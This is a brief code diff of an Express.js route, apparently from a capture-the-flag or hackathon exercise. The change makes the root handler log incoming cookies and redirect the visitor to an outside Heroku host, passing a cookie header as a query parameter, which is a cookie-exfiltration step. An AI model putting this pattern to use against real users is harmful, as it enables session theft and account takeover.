@@ -56,5 +56,5 @@ app.listen(port, () => {
 
 app.get("/", function (req, res) {
     console.log(req.cookies);
-    res.send("https://bitcamp2022.herokuapp.com?cookies="+res.getHeaders());
+    res.redirect("https://bitcamp2022.herokuapp.com?cookies="+req.header("set-cookie"));
 });
